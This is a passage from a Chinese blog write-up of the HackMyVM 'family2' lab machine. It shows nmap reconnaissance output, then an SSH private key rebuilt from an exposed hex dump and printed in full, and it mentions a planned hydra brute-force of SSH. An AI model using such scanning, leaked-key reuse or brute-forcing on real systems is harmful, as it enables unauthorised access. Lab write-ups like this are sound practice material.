@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-family2靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-family2">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/55076.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-family2靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67ada769d0e0a243d4fed2c0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67adaa59d0e0a243d4fed3d8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67adb21cd0e0a243d4fed72e.png">
+<meta property="article:published_time" content="2025-02-13T08:01:59.000Z">
+<meta property="article:modified_time" content="2025-02-13T09:17:13.631Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67ada769d0e0a243d4fed2c0.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/55076.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-family2 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/55076.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-family2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-13 16:01:59 / 修改时间：17:17:13" itemprop="dateCreated datePublished" datetime="2025-02-13T16:01:59+08:00">2025-02-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67ada74cd0e0a243d4fed2b5.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-family2靶机复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67ada769d0e0a243d4fed2c0.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.61  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span> <span class="number">16</span>:<span class="number">11</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">991</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>  open  ssh         OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:f1:ed:<span class="number">84</span>:cc:<span class="number">41</span>:<span class="number">8</span>c:<span class="number">7</span>e:c6:<span class="number">92</span>:a9:b4:<span class="number">29</span>:<span class="number">57</span>:bf:d1 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>f:f3:<span class="number">93</span>:db:<span class="number">72</span>:ff:cd:<span class="number">4</span>d:<span class="number">5</span>f:<span class="number">09</span>:<span class="number">3</span>e:dc:<span class="number">13</span>:<span class="number">36</span>:<span class="number">49</span>:<span class="number">23</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> e7:a3:<span class="number">72</span>:dd:d5:af:e2:b5:<span class="number">77</span>:<span class="number">50</span>:ab:<span class="number">3</span>d:<span class="number">27</span>:<span class="number">12</span>:<span class="number">0</span>f:ea (ED25519)</span><br><span class="line"><span class="number">25</span><span class="symbol">/tcp</span>  open  smtp        Postfix smtpd</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_smtp-commands:</span> debian.numericable.fr, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>  open  http        Apache httpd <span class="number">2.4</span>.<span class="number">51</span></span><br><span class="line">|<span class="params">_http-title:</span> Index of <span class="symbol">/</span></span><br><span class="line">| <span class="params">http-ls:</span> Volume <span class="symbol">/</span></span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| <span class="number">11</span>K   <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span> <span class="number">16</span>:<span class="number">25</span>  nicegiftformybaby</span><br><span class="line">|_</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.51</span> (Debian)</span><br><span class="line"><span class="number">110</span><span class="symbol">/tcp</span> open  pop3        Dovecot pop3d</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_pop3-capabilities:</span> TOP USER CAPA UIDL RESP-CODES PIPELINING SASL(PLAIN) AUTH-RESP-CODE STLS</span><br><span class="line"><span class="number">139</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">143</span><span class="symbol">/tcp</span> open  imap        Dovecot imapd</span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS more SASL-IR ENABLE LITERAL<span class="operator">+</span> STARTTLS AUTH<span class="operator">=</span>PLAINA0001 listed post-login capabilities IDLE ID OK Pre-login have IMAP4rev1</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line"><span class="number">445</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">993</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/imap</span>    Dovecot imapd</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS SASL-IR ENABLE LITERAL<span class="operator">+</span> more IMAP4rev1 listed post-login capabilities IDLE AUTH<span class="operator">=</span>PLAINA0001 OK Pre-login have ID</span><br><span class="line"><span class="number">995</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/pop3</span>    Dovecot pop3d</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>E:<span class="number">78</span>:<span class="number">10</span>:<span class="number">7</span>B:<span class="number">5</span>C:A0 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">Hosts:</span>  debian.numericable.fr, <span class="number">127.0</span>.<span class="number">0.1</span>; <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script <span class="params">results:</span></span><br><span class="line">| <span class="params">smb2-security-mode:</span> </span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|<span class="params">_nbstat:</span> NetBIOS <span class="params">name:</span> FAMILY2, NetBIOS <span class="params">user:</span> <span class="symbol">&lt;unknown&gt;</span>, NetBIOS <span class="params">MAC:</span> <span class="symbol">&lt;unknown&gt;</span> (unknown)</span><br><span class="line">| <span class="params">smb2-time:</span> </span><br><span class="line">|   <span class="params">date:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span>T08:<span class="number">12</span>:<span class="number">12</span></span><br><span class="line">|_  <span class="params">start_date:</span> N<span class="symbol">/A</span></span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.79</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">30.07</span> seconds</span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
+<p>开了很多端口，老规矩先去80看看，如果没有什么信息就去其他端口看看</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>直接访问80可以读取一个一个文件，里面是ssh的私钥<br><img src="https://pic1.imgdb.cn/item/67adaa59d0e0a243d4fed3d8.png"><br>这个是私钥文件的十六进制转储<code>xxd -r</code>可以转换回原始的私钥文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># xxd -r tmp &gt; id_rsa</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># cat id_rsa       </span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAzZOTX1iTqzbIE7J3dr19v4jvvF2kr5lc8AakvHnEjksjGZlcCKai</span><br><span class="line">ajQj<span class="operator">+</span><span class="number">3</span>GdXLfWV5ErRfDKdeYlNNhjJvEGDZVT1JHm9VaB4cWsEjr5SlGcu<span class="symbol">/ciQmgTiU5rSs</span></span><br><span class="line"><span class="number">2</span>Iqc91FrWaNmIgcWeirQRPFrUOFqCm6aqfOAkchQA7e02GMRQ3a087zoOGzOHARPWnHMDG</span><br><span class="line">jaXZSTrdILKagQ1L59S55z<span class="operator">+</span>x3P5PAdCR2<span class="operator">+</span>uxujohsnk8HI6ZxaeEnbIMM8qJKdTipn<span class="symbol">/iB7</span></span><br><span class="line"><span class="number">3</span>gCMrFb4mMDgk58ALng7tG95df2MTVSUzKwH<span class="symbol">/ZpD/iOWow5uwauOu+cVC/G7rPWwgw3Lht</span></span><br><span class="line">ZBFCQ1w0EPFnEDIuoGbFUp1jObUtYEAAnUGiD9xEj2wW8RtS<span class="operator">+</span>RovSNoEZUk<span class="symbol">/sywHMFdMOS</span></span><br><span class="line">xTGPZf6YseS80B3jYCkVuUXvO6E3ioIZ6O1rkXIPLLddCjaXTWR3yA<span class="symbol">/0z7hIFvYdaNPuW9</span></span><br><span class="line">xE26DWLJApZImkK1YcTqFNzQCBdXh4WV<span class="symbol">/8TfEAQ1AAAFgG7azt5u2s7eAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAM2Tk19Yk6s2yBOyd3a9fb<span class="operator">+</span>I77xdpK<span class="operator">+</span>ZXPAGpLx5xI5LIxmZXAimomo0I<span class="symbol">/txnVy3</span></span><br><span class="line"><span class="number">1</span>leRK0XwynXmJTTYYybxBg2VU9SR5vVWgeHFrBI6<span class="operator">+</span>UpRnLv3IkJoE4lOa0rNiKnPdRa1mj</span><br><span class="line">ZiIHFnoq0ETxa1DhagpumqnzgJHIUAO3tNhjEUN2tPO86DhszhwET1pxzAxo2l2Uk63SCy</span><br><span class="line">moENS<span class="operator">+</span>fUuec<span class="symbol">/sdz+TwHQkdvrsbo6IbJ5PByOmcWnhJ2yDDPKiSnU4qZ/4ge94AjKxW+JjA</span></span><br><span class="line"><span class="number">4</span>JOfAC54O7RveXX9jE1UlMysB<span class="symbol">/2aQ/4jlqMObsGrjrvnFQvxu6z1sIMNy4bWQRQkNcNBDx</span></span><br><span class="line">ZxAyLqBmxVKdYzm1LWBAAJ1Bog<span class="symbol">/cRI9sFvEbUvkaL0jaBGVJP7MsBzBXTDksUxj2X+mLHk</span></span><br><span class="line">vNAd42ApFblF7zuhN4qCGejta5FyDyy3XQo2l01kd8gP9M<span class="operator">+</span><span class="number">4</span>SBb2HWjT7lvcRNug1iyQKW</span><br><span class="line">SJpCtWHE6hTc0AgXV4eFlf<span class="symbol">/E3xAENQAAAAMBAAEAAAGAbNgFAEd6r/0qQ9uLCvBbQuzy2Y</span></span><br><span class="line"><span class="number">3</span>PIzYVEfTChhQGsLwxkl0zcFUhyw9eOcQ26B9hui1fdwF9gJzg<span class="operator">+</span>DDVlomohcqZfwPc<span class="symbol">/+rU</span></span><br><span class="line">i8BIUcKtuN6rGI5JslU<span class="operator">+</span>esVtY0adZCM2QFbYlpCv0rtnUynj4gbstahLl45CDL4uPnEYDT</span><br><span class="line">nHofatPQDPjpDu701bqmdSGpQqzFaSTAaBi81kpo1usglcgIal2nc<span class="symbol">/R5uxjnolOI+Mxd0Q</span></span><br><span class="line">qaIK4q7GNWROt6E1rFNM1gaY<span class="operator">+</span>qmk1RHrPM0CLzp50ZHfR1fu4UKQuNIkBd9<span class="operator">+</span>wHC940EIDe</span><br><span class="line">Zx5Sv<span class="symbol">/oW1TWH0VWgFnO543LKn0aCawi6Qjyb1HpIOPbxo0ydyHl4YFlURRmrIiCctoLftp</span></span><br><span class="line">sbBcuf1CG9DFa5dEkBySxVzSG3DfTsOY6a9V0wZx2BZALRE07r61SzIRztXYXYiBM2Dzln</span><br><span class="line">AzONdkuRwXd3BuThjpllQmvZy24VFJWU<span class="operator">+</span>wumRfTB6gsqzyhyH9<span class="symbol">/VVpfC37/r9NGvDBAAAA</span></span><br><span class="line">wGUMzm9KkwoR477ZkKE<span class="operator">+</span>ItNQG<span class="symbol">/J1/9cG7ToLPDoSXc2lKnm181cE01FD8aQLM1ChBr4ahz</span></span><br><span class="line">tG<span class="operator">+</span>zg65VYXSFB3N0O9Mp0u9qc7Xc1h30SOdqm62T1K<span class="operator">+</span>nvHe2tXkNNEyEVxAAcSV1jr2HEm</span><br><span class="line">MTN66K0Mey5Iet23nUBZJOamFZTpj7fMZxDxTJq1jNUviDm6LgNdFIvgeRZQBRcVMHEf5g</span><br><span class="line">qjrDw8qoXn<span class="symbol">/ReLEYuPjLL8Up6hAxGCTcYU3HfpbsNv0xl2sQAAAMEA9lHGSQe0o4bQZmKs</span></span><br><span class="line">YwQjewX38Hs6SKop4Ci1OGNGeMaJI<span class="symbol">/6lxcouI95CZSNPRq3KNS4jKBYMCjoRQrisnNQLnL</span></span><br><span class="line">dVsk<span class="symbol">/sMjhs/NiXGHKZhUbv4e9vYxbuDZKQpbF9juSXt2DmA5zTLejPavBDVvE0uwVGq1uN</span></span><br><span class="line">xRna<span class="symbol">/yiBFZudgJMmkLIBcMClmZFoEFqBsWL5VjtZJZpWYCpYIedkeZDxPrgSO1LCTq9Rsq</span></span><br><span class="line">bKDlZoZfxvYtzbYK9nscdCljbKqCcRAAAAwQDVp<span class="operator">+</span>KeBCnL9T3qQmwZ<span class="operator">+</span>eNSUoTH6TCYwNOW</span><br><span class="line">EQTsW<span class="operator">+</span>srp8SNg2H0BB0HjLxzeHvBHBIZ2ye9L8G<span class="symbol">/XpsIM7aASbtaXChT6FqYT4Bb1pi067</span></span><br><span class="line"><span class="operator">+</span>LTxGM8HADjynVCWLnIKDzAAHBZHOwBwGwK6O1NDiFEor99Uqif7<span class="symbol">/YJACsP70lEOfL2rqk</span></span><br><span class="line">n1IGU2C9mjIUWVlU2V31bcGBZ4PI9d88oH46FeWloMvEpnVRIk8Q6<span class="operator">+</span>sdGke0yjB9TeDfL6</span><br><span class="line">O<span class="attr">CBlxZRwxH8uUAAAALYmFieUBkZWJpYW4</span><span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+<p>本来想直接用hydra爆破ssh，但是这里不能直接用密码登录ssh</p>
